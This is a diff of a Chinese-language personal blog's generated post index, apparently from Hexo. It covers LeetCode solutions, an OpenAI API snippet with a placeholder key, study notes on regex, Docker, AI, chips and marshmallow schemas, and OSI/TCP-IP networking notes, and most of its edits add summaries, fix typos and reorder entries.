 <h3 id="1480-一维数组的动态和"><a href="#1480-一维数组的动态和" class="headerlink" title="1480.一维数组的动态和"></a>1480.一维数组的动态和</h3><p>给你一个数组 nums 。数组「动态和」的计算公式为：runningSum[i] = sum(nums[0]…nums[i]) 。请返回 nums 的动态和。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def runningSum(self, nums:List[int])-&gt;List[int]:</span><br><span class="line">        n = len(nums)</span><br><span class="line">        if n &lt; 1:</span><br><span class="line">            return nums[0]</span><br><span class="line">        for i in range(1,n):</span><br><span class="line">            nums[i] += nums[i-1]</span><br><span class="line">        return nums</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">runningSum</span>(<span class="params">self, nums</span>):</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            nums[i] += nums[i-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></figure>
 <h3 id="1342-将数字变成0的操作次数"><a href="#1342-将数字变成0的操作次数" class="headerlink" title="1342.将数字变成0的操作次数"></a>1342.将数字变成0的操作次数</h3><p>给你一个非负整数 <code>num</code> ，请你返回将它变成 0 所需要的步数。 如果当前数字是偶数，你需要把它除以 2 ；否则，减去 1 。</p>
 <p>笨比解法</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numberOfSteps</span>(<span class="params">self, num</span>):</span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                num = num/<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">            step = step + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfSteps</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num != <span class="number">0</span> &amp;&amp; ++ans &gt;= <span class="number">0</span>) num = num % <span class="number">2</span> == <span class="number">0</span> ? num / <span class="number">2</span> : num - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>位运算</p>
-<p>思路与算法：将 <em>num</em> 与 11 进行位运算来判断 <em>num</em> 的奇偶性。<br>记录操作次数时：<br>如果 num 是奇数，我们需要加上一次减1的操作。如果 num&gt;1，我们需要加上一次除以 2的操作。<br>然后使 <em>num</em> 的值变成$\frac{ ⌊num⌋}{2}$。重复以上操作直到<em>num</em>=0 时结束操作.</p>
+<p>思路与算法：将 <em>num</em> 与 1 进行位运算来判断 <em>num</em> 的奇偶性。<br>记录操作次数时：<br>如果 num 是奇数，我们需要加上一次减1的操作。如果 num&gt;1，我们需要加上一次除以 2的操作。<br>然后使 <em>num</em> 的值变成$\frac{ ⌊num⌋}{2}$。重复以上操作直到<em>num</em>=0 时结束操作.</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numberOfSteps</span>(<span class="params">self, num</span>):</span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">            step += num &amp; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num &gt; <span class="number">1</span>:</span><br><span class="line">                step += <span class="number">1</span></span><br><span class="line">            num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure>
 <p>数学（二进制性质）</p>
 <p>总的操作次数为 = 右移次数 + 消减次数 ：<br>右移次数：num 中最高位1的所在的位置；<br>消减次数：num 中1的个数。</p>
@@ -928,7 +1274,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <li><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_linux_x86_64.deb">ChatGPT_0.12.0_linux_x86_64.deb</a>: 体积小，但是兼容性差</li>
 <li><a href="https://github.com/lencx/ChatGPT/releases/download/v0.12.0/ChatGPT_0.12.0_linux_x86_64.AppImage.tar.gz">ChatGPT_0.12.0_linux_x86_64.AppImage.tar.gz</a>: 工作可靠</li>
 </ul>
-<h2 id="调用API实用chatgpt"><a href="#调用API实用chatgpt" class="headerlink" title="调用API实用chatgpt"></a>调用API实用chatgpt</h2><p>在<a href="https://platform.openai.com/account/api-keys">Account API Keys - OpenAI API</a>界面中查看api</p>
+<h2 id="调用API使用chatgpt"><a href="#调用API使用chatgpt" class="headerlink" title="调用API使用chatgpt"></a>调用API使用chatgpt</h2><p>在<a href="https://platform.openai.com/account/api-keys">Account API Keys - OpenAI API</a>界面中查看api</p>
 <p><img src="/2023/03/23/openai/../../../../../blog/source/_posts/docker/image-20230323170956954.png" alt="image-20230323170956954"></p>
 <p>然后运行程序</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the API key</span></span><br><span class="line">openai.api_key = <span class="string">&quot;YOUR_API_KEY&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the model and prompt</span></span><br><span class="line">model_engine = <span class="string">&quot;text-davinci-003&quot;</span></span><br><span class="line">prompt = <span class="string">&quot;YOUR_QUESTIONS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a response</span></span><br><span class="line">completion = openai.Completion.create(</span><br><span class="line">    engine=model_engine,</span><br><span class="line">    prompt=prompt,</span><br><span class="line">    max_tokens=<span class="number">1024</span>,</span><br><span class="line">    n=<span class="number">1</span>,</span><br><span class="line">    stop=<span class="literal">None</span>,</span><br><span class="line">    temperature=<span class="number">0.5</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the response text</span></span><br><span class="line">message = completion.choices[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
@@ -945,7 +1291,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>正则表达式</title>
     <url>/2023/03/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="用于搜索的元字符"><a href="#用于搜索的元字符" class="headerlink" title="用于搜索的元字符"></a>用于搜索的元字符</h3><div class="table-container">
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>正则表达式的语法规则</p>
+<span id="more"></span>
+<h3 id="用于搜索的元字符"><a href="#用于搜索的元字符" class="headerlink" title="用于搜索的元字符"></a>用于搜索的元字符</h3><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1217,7 +1565,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>docker</title>
     <url>/2023/02/26/docker/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>容器的集装箱概念是参照了航运中的集装箱概念，在航运中不关心你运输的是汽车还是棉花，它都通过集装箱将运输的流程规范成了标准化的操作，这里容器的使命也是一样，容器具备自包含的能力，将自身程序所依赖的程序全部包含在了容器中，通过Docker将底层环境打平，用户可以将一个容器镜像运行在任何操作系统的宿主机上，也就是Docker所说的“Build once, Run anywhere”。<br><img src="/2023/02/26/docker/image-20230226125114303.png" alt="image-20230226125114303"></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>容器技术的了解</p>
+<span id="more"></span>
+<p>容器的集装箱概念是参照了航运中的集装箱概念，在航运中不关心你运输的是汽车还是棉花，它都通过集装箱将运输的流程规范成了标准化的操作，这里容器的使命也是一样，容器具备自包含的能力，将自身程序所依赖的程序全部包含在了容器中，通过Docker将底层环境打平，用户可以将一个容器镜像运行在任何操作系统的宿主机上，也就是Docker所说的“Build once, Run anywhere”。<br><img src="/2023/02/26/docker/image-20230226125114303.png" alt="image-20230226125114303"></p>
 <p><strong>容器它的优势有以下几点：</strong></p>
 <ol>
 <li><p>不再依赖于独立的操作系统运行，相比较虚拟机它没有每个独立的操作系统，突破了宿主机的磁盘IO性能，减少了资源使用的浪费。</p>
@@ -1242,7 +1592,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>人工智能</title>
     <url>/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-人工智能基础"><a href="#1-人工智能基础" class="headerlink" title="1 人工智能基础"></a>1 人工智能基础</h1><h2 id="1-1-神经网络"><a href="#1-1-神经网络" class="headerlink" title="1.1 神经网络"></a>1.1 神经网络</h2><p>自提出“人工智能”这一术语开始，科学家们尝试了各种方法来实现它。这些方法包括专家系统，决策树、归纳逻辑、聚类等等，但这些都是假智能。直到人工神经网络技术的出现，才让机器拥有了“真智能”。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>人工智能的兴趣了解</p>
+<span id="more"></span>
+<h1 id="1-人工智能基础"><a href="#1-人工智能基础" class="headerlink" title="1 人工智能基础"></a>1 人工智能基础</h1><h2 id="1-1-神经网络"><a href="#1-1-神经网络" class="headerlink" title="1.1 神经网络"></a>1.1 神经网络</h2><p>自提出“人工智能”这一术语开始，科学家们尝试了各种方法来实现它。这些方法包括专家系统，决策树、归纳逻辑、聚类等等，但这些都是假智能。直到人工神经网络技术的出现，才让机器拥有了“真智能”。</p>
 <p>为什么说之前的方法都是假智能呢？因为我们人类能清清楚楚地知道它们内部的分析过程，它们只是一个大型的复杂的程序而已；而人工神经网络则不同，它的内部是一个黑盒子，就像我们人类的大脑一样，我们不知道它内部的分析过程，我们不知道它是如何识别出人脸的，也不知道它是如何打败围棋世界冠军的。</p>
 <h3 id="人工神经网络构造图"><a href="#人工神经网络构造图" class="headerlink" title="人工神经网络构造图"></a>人工神经网络构造图</h3><p><img src="/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/image-20230225201700318.png" alt="image-20230225201700318"><br>每个圈代表着一个神经元<br><img src="/2023/02/25/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/image-20230225201743017.png" alt="image-20230225201743017">上面的x是神经元的输入，相当于树突接收的多个外部刺激。w是每个输入对应的权重，它影响着每个输入x的刺激强度。<br>大脑的结构越简单，那么智商就越低。人工神经网络也是一样的，网络越复杂它就越强大，所以我们需要深度神经网络。这里的深度是指层数多，层数越多那么构造的神经网络就越复杂。</p>
 <p>训练深度神经网络的过程就叫做深度学习。</p>
@@ -1261,7 +1613,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>芯片</title>
     <url>/2023/02/25/%E8%8A%AF%E7%89%87/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="加法器的组成"><a href="#加法器的组成" class="headerlink" title="加法器的组成"></a>加法器的组成</h2><p>通过与逻辑和异或逻辑即可完成，与逻辑负责进位，异或逻辑负责计算该位的值</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>芯片的兴趣了解</p>
+<span id="more"></span>
+<h2 id="加法器的组成"><a href="#加法器的组成" class="headerlink" title="加法器的组成"></a>加法器的组成</h2><p>通过与逻辑和异或逻辑即可完成，与逻辑负责进位，异或逻辑负责计算该位的值</p>
 <p>如 1 + 1 ，与逻辑看到两个1，所以结果为1；异或逻辑看到两个相同的数，所以结果为0，所以1+1=10</p>
 <p>计算更多位数或者减乘除只需要添加更多的运算单元和逻辑就可以实现。</p>
 <p>所以现在将数学问题转化为了逻辑问题</p>
@@ -1620,7 +1974,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">from marshmallow import Schema<span class="punctuation">,</span>fields</span><br><span class="line">import time</span><br><span class="line">class Peer(Schema)<span class="punctuation">:</span></span><br><span class="line">    ip = fields.Str(required=True)</span><br><span class="line">    port = fields.Int(required=True)</span><br><span class="line">    last_seen = fields.Int(missing=lambda<span class="punctuation">:</span> int(time()))</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">payload = &#x27;<span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.0.1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span><span class="string">&quot;8888&quot;</span><span class="punctuation">,</span><span class="attr">&quot;last_seen&quot;</span><span class="punctuation">:</span><span class="string">&quot;1589780748&quot;</span><span class="punctuation">&#125;</span>&#x27;</span><br><span class="line"># 反序列化</span><br><span class="line">result = Peer().loads(payload)</span><br><span class="line"># 序列化</span><br><span class="line">serialized = Peer().dumps(result)</span><br><span class="line">print(result)</span><br><span class="line">print(serialized)</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;ip&#x27;<span class="punctuation">:</span> &#x27;<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>&#x27;<span class="punctuation">,</span> &#x27;port&#x27;<span class="punctuation">:</span> <span class="number">8888</span><span class="punctuation">,</span> &#x27;last_seen&#x27;<span class="punctuation">:</span> <span class="number">1589780748</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.0.1&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8888</span><span class="punctuation">,</span> <span class="attr">&quot;last_seen&quot;</span><span class="punctuation">:</span> <span class="number">1589780748</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <h2 id="Schema模块"><a href="#Schema模块" class="headerlink" title="Schema模块"></a>Schema模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> marshmallow <span class="keyword">import</span> Schema,fields,validates_schema,ValidationError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transaction</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    timestamp = fields.Int()</span><br><span class="line">    sender = fields.Str()</span><br><span class="line">    receiver = fields.Str()</span><br><span class="line">    amount = fields.Int()</span><br><span class="line">    signature = fields.Str()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordered = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    mined_by = fields.Str(required=<span class="literal">False</span>)</span><br><span class="line">    Transactions = fields.Nested(Transaction(),many=<span class="literal">True</span>)</span><br><span class="line">    height = fields.Int(required = <span class="literal">True</span>)</span><br><span class="line">    target = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">hash</span> = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    previous_hash = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    nonce = fields.Int(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordered = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @validates_schema</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_hash</span>(<span class="params">self,data,**kwargs</span>):</span><br><span class="line">        block = data.copy()</span><br><span class="line">        block.pop(<span class="string">&quot;hash&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;hash&quot;</span>]!=json.dumps(block,sort_keys=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&quot;Fraudulent block:hash is wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Peer</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    ip = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    port = fields.Int(required=<span class="literal">True</span>)</span><br><span class="line">    last_seen = fields.Int(missing = <span class="keyword">lambda</span>:<span class="built_in">int</span>(time()))</span><br></pre></td></tr></table></figure>
 <p>在代码中，我们实现了Peer、Block和Transaction。</p>
-<h2 id="message模块"><a href="#message模块" class="headerlink" title="message模块"></a>message模块</h2>]]></content>
+<h2 id><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
       <categories>
         <category>区块链</category>
       </categories>
@@ -3342,65 +3696,6 @@ S:00011011\ 芯片序列：-1 -1 -1 +1 +1 -1 +1 +1\\T:00101110\ 芯片序列：-
   </entry>
   <entry>
     <title>体系结构&amp;参考模型</title>
-    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
-<span id="more"></span>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231141405853-16727927031211.png" alt></p>
-<p>对等实体之间才有协议，下层为上层提供服务</p>
-<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
-<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
-<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
-<li>结构上可分割开。每层都采用最合适的技术来实现</li>
-<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
-<li>整个分层结构应该能促进标准化工作</li>
-</ol>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142532860-16727928089353.png" alt></p>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142709447.png" style="zoom:80%;"></p>
-<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
-<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
-<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
-<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
-<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
-<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
-<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
-<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
-</ul>
-<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
-<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
-<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
-<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
-<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
-<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
-<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
-<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
-<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
-<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
-<p>主要协议：TCP，UDP</p>
-<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
-<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
-<p>主要协议：IP、IPX、ICMP</p>
-<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
-<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
-<p>主要协议：PPP</p>
-<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
-<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
-<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
-<p>主要协议：Rj45、802.3</p>
-<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
-<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
-<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
-]]></content>
-      <categories>
-        <category>计算机网络</category>
-      </categories>
-      <tags>
-        <tag>计网概念</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>体系结构&amp;参考模型</title>
     <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&amp;%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
 <span id="more"></span>
@@ -3450,6 +3745,65 @@ S:00011011\ 芯片序列：-1 -1 -1 +1 +1 -1 +1 +1\\T:00101110\ 芯片序列：-
 <p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
 <h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
 <p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+      <tags>
+        <tag>计网概念</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>体系结构&amp;参考模型</title>
+    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
+<span id="more"></span>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231141405853-16727927031211.png" alt></p>
+<p>对等实体之间才有协议，下层为上层提供服务</p>
+<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
+<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
+<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
+<li>结构上可分割开。每层都采用最合适的技术来实现</li>
+<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
+<li>整个分层结构应该能促进标准化工作</li>
+</ol>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142532860-16727928089353.png" alt></p>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142709447.png" style="zoom:80%;"></p>
